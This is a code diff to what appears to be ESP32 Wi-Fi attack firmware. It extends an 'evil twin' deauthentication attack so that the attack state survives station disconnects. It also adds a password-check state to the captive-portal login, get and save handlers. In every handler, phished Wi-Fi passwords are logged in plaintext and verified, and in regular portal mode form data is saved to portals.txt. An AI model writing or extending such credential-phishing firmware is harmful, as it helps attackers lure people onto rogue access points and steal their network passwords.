@@ -1225,6 +1225,8 @@ static void wifi_event_handler(void *event_handler_arg,
                     connectAttemptCount++;
                     esp_wifi_connect();
                 }
+            } else if (applicationState == DEAUTH_EVIL_TWIN) {
+                ESP_LOGW(TAG, "Evil twin: STA disconnect while attack active, keeping state");
             } else {
                 ESP_LOGW(TAG, "Set app state to IDLE");
                 applicationState = IDLE;
@@ -5883,7 +5885,8 @@ static esp_err_t login_handler(httpd_req_t *req) {
         MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
         
         // If in evil twin mode, verify the password (save will happen after verification)
-        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+        if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
+            evilTwinSSID != NULL) {
             verify_password(decoded_password);
         } else {
             // Regular portal mode - save all form data to portals.txt
@@ -5976,7 +5979,8 @@ static esp_err_t get_handler(httpd_req_t *req) {
                     MY_LOG_INFO(TAG, "Password: %s", decoded_password);
                     
                     // If in evil twin mode, verify the password (save will happen after verification)
-                    if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+                    if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
+                        evilTwinSSID != NULL) {
                         verify_password(decoded_password);
                     } else {
                         // Regular portal mode - save all form data to portals.txt
@@ -6078,7 +6082,8 @@ static esp_err_t save_handler(httpd_req_t *req) {
         MY_LOG_INFO(TAG, "Password: %s", decoded_password);
         
         // If in evil twin mode, verify the password (save will happen after verification)
-        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+        if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
+            evilTwinSSID != NULL) {
             verify_password(decoded_password);
         } else {
             // Regular portal mode - save all form data to portals.txt
